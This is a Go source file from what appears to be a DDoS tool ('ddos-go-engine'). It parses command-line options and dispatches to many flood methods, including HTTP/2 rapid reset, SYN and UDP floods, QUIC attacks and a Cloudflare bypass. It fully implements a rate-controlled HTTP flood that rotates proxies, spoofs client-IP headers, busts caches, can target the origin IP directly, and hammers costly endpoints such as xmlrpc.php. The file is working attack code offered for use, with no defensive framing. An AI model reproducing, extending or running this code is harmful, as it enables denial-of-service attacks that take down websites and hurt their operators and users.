package attack

import (
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"
	"os"
	"runtime"
	"runtime/debug"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"ddos-go-engine/internal/proxy"
)

var globalProxyRotator *proxy.ProxyRotator

// Main entry point called from cmd/go_engine
func Main() {
	defer func() {
		if r := recover(); r != nil {
			log.Printf("FATAL panic recovered in main: %v\n%s", r, debug.Stack())
			outputResult()
		}
	}()

	cfg := parseArgs()
	if cfg == nil {
		return
	}

	runtime.GOMAXPROCS(runtime.NumCPU())
	debug.SetGCPercent(50)

	if cfg.ProxyChain != "" {
		globalProxyChain = cfg.ProxyChain
		log.Printf("Proxy chain: %s", cfg.ProxyChain)
	} else {
		globalProxyPool = proxy.NewProxyPool()
	}

	log.Printf("Go Engine v%s starting | Target: %s | Method: %s | Duration: %ds | RPS: %d | Threads: %d",
		Version, cfg.Target, cfg.Method, cfg.Duration, cfg.RPS, cfg.Threads)

	go gcDaemon(cfg.Duration)
	go statsReporter(cfg.Duration)

	if cfg.ProxyFile != "" {
		globalProxyRotator = proxy.NewProxyRotator(cfg.ProxyFile, cfg.Timeout, http2Enabled)
		log.Printf("Proxy rotator: loaded %d proxies from %s",
			globalProxyRotator.Count(), cfg.ProxyFile)
	}

	switch cfg.MethodType {
	case "rapid_reset":
		runRapidReset(cfg)
	case "continuation":
		runContinuationFlood(cfg)
	case "syn_flood":
		runSynFlood(cfg)
	case "udp_flood":
		runUDPFlood(cfg)
	case "post_bomb":
		runPostBomb(cfg)
	case "amplification":
		runAmplification(cfg)
	case "conn_flood":
		runConnectionFlood(cfg)
	case "ws_storm":
		runWebSocketStorm(cfg)
	case "settings_flood":
		runSettingsFlood(cfg)
	case "tls_reneg":
		runTLSRenegFlood(cfg)
	case "cache_bypass":
		runCacheBypassFlood(cfg)
	case "smuggling":
		runRequestSmuggling(cfg)
	case "hpack_bomb":
		runHpackBomb(cfg)
	case "quic_stream_hijack":
		runQUICStreamHijack(cfg)
	case "quic_cid_flood":
		runQUICConnFlood(cfg)
	case "quic_crypto_exhaust":
		runQUICCryptoExhaust(cfg)
	case "underminr":
		runUnderminrBypass(cfg)
	case "http_flood_enhanced":
		runHTTPFloodEnhanced(cfg)
	case "http_flood":
		runHTTPFlood(cfg)
	default:
		// Use enhanced version by default for better Cloudflare bypass
		runHTTPFloodEnhanced(cfg)
	}

	outputResult()
}

func gcDaemon(duration int) {
	defer func() {
		if r := recover(); r != nil {
			log.Printf("GC daemon recovered: %v", r)
		}
	}()
	ticker := time.NewTicker(30 * time.Second)
	defer ticker.Stop()
	end := time.Now().Add(time.Duration(duration) * time.Second)
	for time.Now().Before(end) {
		<-ticker.C
		if atomic.LoadInt32(&stopFlag) == 1 {
			return
		}
		runtime.GC()
		atomic.AddInt64(&metrics.GCRuns, 1)
	}
}

func statsReporter(duration int) {
	defer func() {
		if r := recover(); r != nil {
			log.Printf("Stats reporter recovered: %v", r)
		}
	}()
	ticker := time.NewTicker(500 * time.Millisecond)
	defer ticker.Stop()
	startTime := time.Now()
	end := startTime.Add(time.Duration(duration) * time.Second)
	lastCompleted := int64(0)
	lastTime := startTime

	for time.Now().Before(end) {
		<-ticker.C
		if atomic.LoadInt32(&stopFlag) == 1 {
			return
		}

		now := time.Now()
		elapsed := time.Since(startTime).Seconds()
		ok := atomic.LoadInt64(&metrics.Completed)
		fail := atomic.LoadInt64(&metrics.Failed)
		inflight := atomic.LoadInt64(&metrics.InFlight)
		intervalSec := now.Sub(lastTime).Seconds()
		intervalRPS := float64(ok-lastCompleted) / max64(intervalSec, 0.1)
		lastCompleted = ok
		lastTime = now

		metricsMu.Lock()
		metrics.CurrentRPS = intervalRPS
		if intervalRPS > metrics.PeakRPS {
			metrics.PeakRPS = intervalRPS
		}
		metricsMu.Unlock()

		log.Printf("[STATS] elapsed=%.0fs ok=%d fail=%d in_flight=%d rps=%.1f mem=%dMB",
			elapsed, ok, fail, inflight, intervalRPS, getMemoryMB())
	}
}

func outputResult() {
	metricsMu.RLock()
	m := metrics
	metricsMu.RUnlock()
	m.Status = "STOPPED"

	data, _ := json.Marshal(m)
	fmt.Println()
	fmt.Println(string(data))
}

func parseArgs() *AttackConfig {
	if len(os.Args) < 3 {
		fmt.Print(`Go Engine v` + Version + `
Usage: go_engine.exe -target URL -method METHOD [options]

Required:
  -target URL       Target URL
  -method METHOD    Attack method (http-flood, rapid-reset, syn-flood, udp-flood, underminr,
                    quic-stream-hijack, quic-cid-flood, quic-crypto-exhaust)

Options:
  -duration N       Duration in seconds (default: 60)
  -rps N            Target requests per second (default: 1000)
  -threads N        Number of goroutines (default: CPU*2)
  -timeout N        HTTP timeout seconds (default: 10)
  -keepalive N      Keep-alive seconds (default: 90)
  -max-conns N      Max concurrent connections (default: 5000)
  -http2            Enable HTTP/2
  -origin IP        Origin IP override
  -proxy-file PATH  Proxy file path
  -proxy-chain URL  SOCKS5 proxy chain
  -ja3 PROFILE     TLS fingerprint profile (chrome136, chrome120, firefox140, safari18, edge136)
  -ja4             Enable JA4 fingerprint reporting
`)
		return nil
	}

	cfg := &AttackConfig{
		Duration:   60,
		RPS:        1000,
		Threads:    runtime.NumCPU() * 2,
		Timeout:    10,
		KeepAlive:  90,
		MethodType: "http_flood",
		MaxConns:   30000,
	}

	for i := 1; i < len(os.Args); i++ {
		switch os.Args[i] {
		case "-target":
			if i+1 < len(os.Args) {
				cfg.Target = os.Args[i+1]
				i++
			}
		case "-method":
			if i+1 < len(os.Args) {
				cfg.Method = os.Args[i+1]
				i++
				switch cfg.Method {
				case "rapid-reset":
					cfg.MethodType = "rapid_reset"
				case "continuation":
					cfg.MethodType = "continuation"
				case "syn-flood":
					cfg.MethodType = "syn_flood"
				case "udp-flood":
					cfg.MethodType = "udp_flood"
				case "post-bomb":
					cfg.MethodType = "post_bomb"
				case "amplification":
					cfg.MethodType = "amplification"
				case "conn-flood":
					cfg.MethodType = "conn_flood"
				case "ws-storm":
					cfg.MethodType = "ws_storm"
				case "settings-flood":
					cfg.MethodType = "settings_flood"
				case "tls-reneg":
					cfg.MethodType = "tls_reneg"
				case "cache-bypass":
					cfg.MethodType = "cache_bypass"
				case "smuggling":
					cfg.MethodType = "smuggling"
				case "hpack-bomb":
					cfg.MethodType = "hpack_bomb"
				case "quic-stream-hijack":
					cfg.MethodType = "quic_stream_hijack"
				case "quic-cid-flood":
					cfg.MethodType = "quic_cid_flood"
				case "quic-crypto-exhaust":
					cfg.MethodType = "quic_crypto_exhaust"
				case "underminr":
					cfg.MethodType = "underminr"
				case "http-flood":
					cfg.MethodType = "http_flood"
				case "http-flood-enhanced":
					cfg.MethodType = "http_flood_enhanced"
				default:
					cfg.MethodType = "http_flood"
				}
			}
		case "-duration":
			if i+1 < len(os.Args) {
				cfg.Duration, _ = strconv.Atoi(os.Args[i+1])
				i++
			}
		case "-rps":
			if i+1 < len(os.Args) {
				cfg.RPS, _ = strconv.Atoi(os.Args[i+1])
				i++
			}
		case "-threads":
			if i+1 < len(os.Args) {
				cfg.Threads, _ = strconv.Atoi(os.Args[i+1])
				i++
			}
		case "-timeout":
			if i+1 < len(os.Args) {
				cfg.Timeout, _ = strconv.Atoi(os.Args[i+1])
				i++
			}
		case "-keepalive":
			if i+1 < len(os.Args) {
				cfg.KeepAlive, _ = strconv.Atoi(os.Args[i+1])
				i++
			}
		case "-max-conns":
			if i+1 < len(os.Args) {
				cfg.MaxConns, _ = strconv.Atoi(os.Args[i+1])
				i++
			}
		case "-http2":
			cfg.HTTP2 = true
			http2Enabled = true
		case "-rapid-reset":
			cfg.RapidReset = true
			cfg.MethodType = "rapid_reset"
		case "-origin":
			if i+1 < len(os.Args) {
				cfg.OriginIP = os.Args[i+1]
				i++
			}
		case "-proxy-file":
			if i+1 < len(os.Args) {
				cfg.ProxyFile = os.Args[i+1]
				i++
			}
		case "-proxy-chain":
			if i+1 < len(os.Args) {
				cfg.ProxyChain = os.Args[i+1]
				i++
			}
		case "-ja3":
			if i+1 < len(os.Args) {
				cfg.Method = os.Args[i+1]
				i++
			}
		case "-ja4":
			cfg.HTTP2 = true
		}
	}

	if cfg.Target == "" {
		log.Fatal("Target is required")
	}

	if cfg.Threads < 1 {
		cfg.Threads = 1
	}
	if cfg.MaxConns < 100 {
		cfg.MaxConns = 100
	}

	return cfg
}

func runHTTPFlood(cfg *AttackConfig) {
	atomic.StoreInt32(&stopFlag, 0)
	startTime := time.Now()
	deadline := startTime.Add(time.Duration(cfg.Duration) * time.Second)

	transport := getTransport(cfg.Timeout, cfg.KeepAlive, cfg.MaxConns)
	defer transport.CloseIdleConnections()

	client := &http.Client{
		Transport: transport,
		Timeout:   time.Duration(cfg.Timeout) * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	target := cfg.Target
	if cfg.OriginIP != "" {
		parsed, _ := url.Parse(target)
		target = fmt.Sprintf("%s://%s%s", parsed.Scheme, cfg.OriginIP, parsed.Path)
		if parsed.RawQuery != "" {
			target += "?" + parsed.RawQuery
		}
	}

	parsedTarget, err := url.Parse(target)
	if err != nil {
		log.Printf("Invalid target URL: %v", err)
		return
	}

	hostHeader := parsedTarget.Host
	if cfg.OriginIP != "" {
		origParsed, _ := url.Parse(cfg.Target)
		hostHeader = origParsed.Host
	}

	smartEndpoints := []string{
		parsedTarget.Path,
		"/?s=", "/?p=", "/search?q=", "/?q=",
		"/wp-admin/admin-ajax.php?action=heartbeat",
		"/xmlrpc.php",
		"/?random=", "/page/", "/category/", "/tag/",
		"/api/v1/posts", "/api/v1/users", "/api/search",
		"/index.php?option=", "/index.php?id=",
	}
	if smartEndpoints[0] == "" || smartEndpoints[0] == "/" {
		smartEndpoints[0] = "/?_cb="
	}

	semCap := cfg.MaxConns
	if semCap > 50000 {
		semCap = 50000
	}
	sem := make(chan struct{}, semCap)

	workersPerSec := cfg.RPS
	if workersPerSec > 200000 {
		workersPerSec = 200000
	}

	rate := time.NewTicker(time.Second / time.Duration(workersPerSec))
	defer rate.Stop()

	var wg sync.WaitGroup
	parsedBase := parsedTarget.Scheme + "://" + parsedTarget.Host

	doRequest := func(endpoint string) {
		defer wg.Done()
		defer func() { <-sem }()
		defer atomic.AddInt64(&metrics.InFlight, -1)
		defer func() {
			if r := recover(); r != nil {
				atomic.AddInt64(&metrics.Failed, 1)
			}
		}()

		atomic.AddInt64(&metrics.InFlight, 1)
		atomic.AddInt64(&metrics.TotalRequests, 1)

		ts := time.Now().UnixNano()
		uniq := strconv.FormatInt(ts, 36) + strconv.FormatInt(rand63(), 36)
		separator := "?"
		if strings.Contains(endpoint, "?") {
			separator = "&"
		}
		reqURL := parsedBase + endpoint + separator + "_=" + uniq

		req, err := http.NewRequest("GET", reqURL, nil)
		if err != nil {
			atomic.AddInt64(&metrics.Failed, 1)
			return
		}
		req.Host = hostHeader
		req.Header.Set("User-Agent", randomUA())
		req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
		req.Header.Set("Accept-Language", "en-US,en;q=0.9")
		req.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
		req.Header.Set("Pragma", "no-cache")
		req.Header.Set("Connection", "keep-alive")
		req.Header.Set("X-Forwarded-For", randomIP())
		req.Header.Set("X-Real-IP", randomIP())
		req.Header.Set("CF-Connecting-IP", randomIP())
		req.Header.Set("X-Originating-IP", randomIP())
		req.Header.Set("X-Cluster-Client-IP", randomIP())

		var requestClient *http.Client
		if globalProxyRotator != nil && globalProxyRotator.Count() > 0 {
			proxyURL := globalProxyRotator.Next()
			proxyTransport := globalProxyRotator.GetTransport(proxyURL)
			requestClient = &http.Client{
				Transport: proxyTransport,
				Timeout:   time.Duration(cfg.Timeout) * time.Second,
				CheckRedirect: func(req *http.Request, via []*http.Request) error {
					return http.ErrUseLastResponse
				},
			}
		} else {
			requestClient = client
		}

		resp, err := requestClient.Do(req)

		if err != nil {
			if strings.Contains(err.Error(), "deadline") || strings.Contains(err.Error(), "timeout") {
				atomic.AddInt64(&metrics.Timeout, 1)
			} else {
				atomic.AddInt64(&metrics.Failed, 1)
			}
			return
		}

		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()

		if resp.StatusCode >= 500 || resp.StatusCode == 429 {
			atomic.AddInt64(&metrics.Completed, 1)
		} else {
			atomic.AddInt64(&metrics.Completed, 1)
		}
	}

	endpointIdx := uint64(0)

	for time.Now().Before(deadline) {
		if atomic.LoadInt32(&stopFlag) == 1 {
			break
		}

		select {
		case <-rate.C:
		}

		select {
		case sem <- struct{}{}:
			idx := atomic.AddUint64(&endpointIdx, 1)
			endpoint := smartEndpoints[idx%uint64(len(smartEndpoints))]
			wg.Add(1)
			go doRequest(endpoint)
		default:
		}
	}

	atomic.StoreInt32(&stopFlag, 1)

	waitDone := make(chan struct{})
	go func() {
		wg.Wait()
		close(waitDone)
	}()

	select {
	case <-waitDone:
	case <-time.After(time.Duration(cfg.Timeout+5) * time.Second):
		log.Printf("Drain timeout - %d requests still in flight", atomic.LoadInt64(&metrics.InFlight))
	}

	metricsMu.Lock()
	metrics.Elapsed = time.Since(startTime).Seconds()
	metricsMu.Unlock()
}
